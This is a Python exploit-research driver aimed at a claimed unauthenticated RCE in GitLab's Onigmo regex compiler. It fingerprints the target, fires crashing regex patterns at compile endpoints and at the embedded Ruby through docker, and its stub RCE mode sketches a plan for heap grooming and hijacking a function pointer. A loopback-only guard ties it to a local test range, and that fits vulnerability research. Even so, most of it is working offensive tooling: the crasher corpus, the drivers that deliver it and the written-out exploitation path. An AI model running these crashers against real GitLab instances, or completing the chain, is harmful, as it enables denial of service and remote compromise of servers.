#!/usr/bin/env python3
"""
gitlab2shell.py - range-native exploit research driver for CVE-2026-110264
(Onigmo regex-compile integer overflow, CVSS 10.0, unauth RCE; GitLab
7.0 -> fixed 2026-10-21 in 18.11.13/19.0.10/19.1.9/19.2.9/19.3.6/19.4.3/19.5.1).

phpbleed-bastet conventions: hard loopback guard, timestamped [>]/[+]/[x]
log lines, --target profiles, canary-verified scoring contract
("exploit works" == FLAG{gitlab-vuln:...} read via the exploited path).

Modes:
  probe   fingerprint the target (version surfaces, embedded ruby identity,
          pre-auth regex-compile surfaces: org-mode/README render, explore)
  crash   drive regex-compile crashers at the target's worker-crash oracle:
          - target regrush (:8021): POST /compile {source} - oracle = conn
            reset + worker restart (our verified F1-N family)
          - target gitlab (:8022): pre-auth surface attempts + Onigmo
            worker-crash signature watch (502 burst / conn reset / org-mode
            render error burst). Native crasher for the omnibus Onigmo is
            still being hunted (212k+ fuzz samples clean so far).
  rce     TODO structure: overflow -> heap OOB write -> arbitrary read ->
          /CANARY read -> FLAG{...}. Stubs gated on primitive shape from
          the ASAN harness (ladder 4).

Rules of engagement: firing range 127.0.0.1 targets only. Refuses
everything else, no exceptions, no override flag.
"""
import argparse
import json
import socket
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime
from urllib.parse import urlparse

VERSION = "0.1.0-bastet"

BANNER = r"""
      \ /
     ( * )
      \|/
 /\___/\  |
(  o o  ) |          gitlab2shell-bastet
(  =^=  ) |          CVE-2026-110264 driver
 (  "  )  |          the canary sings only for the cat
____/\_____/__|__    who earns FLAG{...}
"""

# ---- target profiles (range compose map) --------------------------------
TARGETS = {
    "regrush":  "http://127.0.0.1:8021",   # harness (official ruby 3.3.12)
    "gitlab":   "http://127.0.0.1:8022",   # gitlab-vuln 19.5.0 (pre-patch)
    "control":  "http://127.0.0.1:8023",   # gitlab-patched 19.5.1
    "embedded": None,                        # omnibus ruby via docker exec/run
}
GLAB_CONTAINER = "gitlab-firing-range-gitlab-vuln-1"
GLAB_RUBY = "/opt/gitlab/embedded/bin/ruby"
GLAB_IMAGE = "gitlab/gitlab-ce:19.5.0-ce.0"

# ---- crasher corpus (deterministic, source-audited / fuzz-derived) -------
# F1-N family: parse-error double-free in official Onigmo 6.1.3 builds
# (ruby 3.3.12/3.4.11 images). NOT present in GitLab omnibus ruby build.
CRASHERS_REGRUSH = [
    ("F1-min",      "a|\\k<-2>"),
    ("F1-lb-call",  "(?<=\\g<n19>)|\\k<-5"),
    ("F1a-quant",   "(?:.|\\k<-85>)*?"),
    ("F1b-seed",    "(?<k1>(?:A((?<x5>)\\g<x5>?)?|\\k<983197910>){9,20}){,1}|\\k<-1916>"),
]
# Integer-overflow candidates (CVE class; omnibus Onigmo accepts the
# compile but fields wrap - candidates awaiting the exact overflow shape).
CRASHERS_GITLAB = [
    ("LB-wrap",     "(?<=(?:a{30000}){100000})"),
    ("LB-nest2^31", "(?<=(?:a{46341}){46341})"),
    ("LB-alt-big",  "(?<=a{100000}|b{100000})"),
    ("deep-alt",    "a|" + "a|" * 40000 + "a"),
]


def log(tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    sys.stdout.write(f"{ts} [{tag}] {msg}\n")
    sys.stdout.flush()


def guard(url):
    """Hard loopback guard - refuses non-127.x hosts."""
    host = urlparse(url).hostname or ""
    if host in ("127.0.0.1", "localhost", "::1") or host.startswith("127."):
        return url
    sys.exit(f"[!] guard: {host!r} is not loopback. Rules of engagement: "
             f"firing-range 127.0.0.1 targets only. Refusing.")


def http(method, url, data=None, headers=None, timeout=15):
    req = urllib.request.Request(url, data=data, method=method,
                                 headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)
    except (urllib.error.URLError, ConnectionError, socket.timeout, socket.gaierror) as e:
        return None, str(e).encode(), {}


# ---------------------------------------------------------------- probe ---
def probe(base, t0):
    if base is None:  # embedded target: docker-based, no URL
        return
    log(">", f"fingerprinting {base}")
    st, body, _ = http("GET", base + "/users/sign_in", timeout=20)
    if st == 200:
        html = body.decode("utf-8", "replace")
        ce = "GitLab Community Edition" in html
        log("+", f"gitlab sign-in 200, CE-markers={'yes' if ce else 'no'}")
        st2, b2, _ = http("GET", base + "/api/v4/version")
        log("+", f"/api/v4/version -> {st2} "
                 f"({'auth required - anonymous cannot read version' if st2 == 401 else b2[:60]})")
        st3, b3, _ = http("GET", base + "/api/v4/projects?visibility=public&simple=true")
        n = 0
        if st3 == 200:
            n = len(json.loads(b3 or b"[]"))
        log("+" if n else "x",
            f"public projects: {n} "
            f"({'org-mode/README render surface available' if n else 'need admin-created public repo for ladder 3'})")
        st4, _, _ = http("GET", base + "/explore")
        log("+" if st4 == 200 else "x", f"/explore -> {st4}")
        return
    # harness profile
    st, body, _ = http("GET", base + "/versions")
    if st == 200:
        v = json.loads(body)
        log("+", f"regrush harness: ruby {v.get('ruby')} p{v.get('patchlevel')} "
                 f"onigmo={v.get('onigmo')} canary={v.get('canary_flagged')}")
        st2, b2, _ = http("GET", base + "/pid")
        log("+", f"harness pid oracle: {b2.decode().strip()} (single-process WEBrick: "
                 f"crash oracle = conn-reset + container restart, not pid change)")
        return
    log("x", f"no known fingerprint answered (sign_in={st}, versions={st})")


# ---------------------------------------------------------------- crash ---
import subprocess


def ruby_probe_docker(src, image=None):
    """Compile src in the omnibus embedded ruby; native crash = rc 134/139.
    Running gitlab-vuln container first, else docker run on pinned image.
    Loopback by construction (local docker only, no network)."""
    code = ("begin; Regexp.new(ARGV[0]); Regexp.new(ARGV[0], Regexp::IGNORECASE); "
            "rescue Exception; end")
    try:
        r = subprocess.run(["docker", "exec", GLAB_CONTAINER, GLAB_RUBY,
                            "-e", code, "--", src],
                           capture_output=True, timeout=20)
        return r.returncode, r.stdout + r.stderr
    except Exception:
        pass
    r = subprocess.run(["docker", "run", "--rm", "--entrypoint", GLAB_RUBY,
                        image or GLAB_IMAGE, "-e", code, "--", src],
                       capture_output=True, timeout=60)
    return r.returncode, r.stdout + r.stderr


def crash_embedded(t0, args):
    """In-process compile oracle against the omnibus embedded ruby - our
    strongest oracle right now (R2/R4: same binary ships in 19.5.0 AND
    19.5.1). Reports per-pattern native-crash verdicts."""
    image = getattr(args, "image", None) or GLAB_IMAGE
    log(">", f"embedded-ruby compile oracle (docker exec/run, image {image})")
    corpus = list(CRASHERS_REGRUSH) + list(CRASHERS_GITLAB)
    seen = set()
    for name, src in corpus:
        if (name, src) in seen:
            continue
        seen.add((name, src))
        rc, out = ruby_probe_docker(src, image)
        verdict = ("WORKER CRASH (native)" if rc in (134, 139) else
                   "clean" if rc == 0 else f"rc={rc}")
        log("+" if rc in (134, 139) else "x",
            f"[{name}] {verdict} {out.decode(errors='replace')[:60]!r}")


def crash_regrush(base, t0):
    """F1-N family against /compile; oracle = request dies + worker restart."""
    st, b, _ = http("GET", base + "/pid")
    pid0 = b.decode().strip() if st == 200 else "?"
    log(">", f"regrush /compile crash run; pre-crash pid={pid0}")
    for name, src in CRASHERS_REGRUSH:
        payload = json.dumps({"source": src}).encode()
        t = time.time()
        st, body, _ = http("POST", base + "/compile", data=payload,
                           headers={"Content-Type": "application/json"},
                           timeout=15)
        dt = time.time() - t
        if st is None:
            time.sleep(2.5)  # allow restart:unless-stopped to bring it back
            st2, b2, _ = http("GET", base + "/pid")
            back = "recovered" if st2 == 200 else "still down"
            log("+", f"[{name}] request killed ({dt:.2f}s) -> WORKER CRASH, "
                     f"service {back}, pid={b2.decode().strip() if st2 == 200 else '?'}")
        else:
            r = body.decode("utf-8", "replace")[:80]
            log("x", f"[{name}] clean response {st} ({dt:.2f}s): {r}")


def crash_gitlab(base, t0):
    """Drive candidates at pre-auth compile surfaces; watch for the
    Onigmo-worker-crash signature. Native crasher for the omnibus Onigmo
    is pending (fuzz continues); this driver exercises the surfaces so a
    crasher drops straight in."""
    log(">", f"gitlab pre-auth crash attempt against {base}")
    # surface: org-mode/README render needs a PUBLIC project (probe reports)
    st, body, _ = http("GET", base + "/api/v4/projects?visibility=public&simple=true")
    projects = json.loads(body or b"[]") if st == 200 else []
    if not projects:
        log("x", "no public project: create one (ladder 3 setup) to open the "
                 "org-mode/README anonymous render surface")
        return
    p = projects[0]
    log("+", f"public project: {p.get('path_with_namespace')} id={p.get('id')}")
    for name, src in CRASHERS_GITLAB:
        # README/org file render path compiles server-side regexes today is
        # only the org-mode TODO/keyword machinery; candidate drop-in point.
        url = f"{base}/api/v4/projects/{p['id']}/repository/files/README.org/raw?ref=main"
        st, body, _ = http("GET", url)
        log("x" if st != 200 else "+",
            f"[{name}] README.org fetch -> {st} (payload placement pending ladder 3)")


# ------------------------------------------------------------------ rce ---
def rce(base, t0):
    """Two-step plan skeleton (staged; plugs in the moment an embedded
    crasher exists):

    STEP 1 - CRASH->CORRUPT: replace the omnibus-clean corpus with the
    embedded crasher; the compile-path overflow (CVE class: heap OOB
    write in the regex compile buffer, size/value/offset per ASAN
    report from regrush-asan:3.3.12) yields a deterministic write.
    Heap grooming slots TBD per primitive class:
      - tcache/jemalloc freelist poisoning (omnibus = jemalloc!):
        arena bin shaping via prior regex compiles (same puma worker);
      - node-table overwrite (regparse Node* arrays) -> later
        onig_node_free -> arbitrary write gadget;
      - bytecode buffer (BBUF) length overflow -> OOB into adjacent
        heap chunk header.
    STEP 2 - READ->EXEC: arbitrary read gadget (forged pointer in a
    freed-then-reused Node) -> leak libruby PIE bias; write primitive
    -> redirect a function pointer on the regex compile path; command
    exec; read /CANARY over the exploited path; verify
    FLAG{gitlab-vuln:...}. Leak-first, no shipped constants (phpbleed
    lineage). ASAN (official lineage) reports the shape; offsets must
    be re-derived on the omnibus jemalloc heap.
    """
    log("x", "rce mode: STAGED - awaiting embedded crasher (step 1 "
             "corpus swap + grooming slots TBD per primitive class).")
    log(">", f"chain state: crasher hunt = {0} native hits on omnibus "
             f"(see lanes/glm/notes.md cumulative counter).")

def main():
    p = argparse.ArgumentParser(description="gitlab2shell - CVE-2026-110264 driver")
    p.add_argument("mode", choices=["probe", "crash", "rce"])
    p.add_argument("--target", default="gitlab", choices=list(TARGETS),
                   help="target profile (or pass --url)")
    p.add_argument("--url", default=None, help="override target base URL (loopback only)")
    p.add_argument("--image", default=None,
                   help="embedded mode: omnibus image tag (default gitlab/gitlab-ce:19.5.0-ce.0)")
    args = p.parse_args()

    if args.mode == "crash" and args.target == "embedded":
        print(BANNER)
        crash_embedded(time.time(), args)
        return
    base = guard(args.url or TARGETS[args.target])
    print(BANNER)
    t0 = time.time()
    if args.mode == "probe":
        probe(base, t0)
    elif args.mode == "crash":
        if args.target == "embedded":
            crash_embedded(t0, args)
        elif args.target == "regrush" or ":8021" in base:
            crash_regrush(base, t0)
        else:
            crash_gitlab(base, t0)
    elif args.mode == "rce":
        rce(base, t0)


if __name__ == "__main__":
    main()
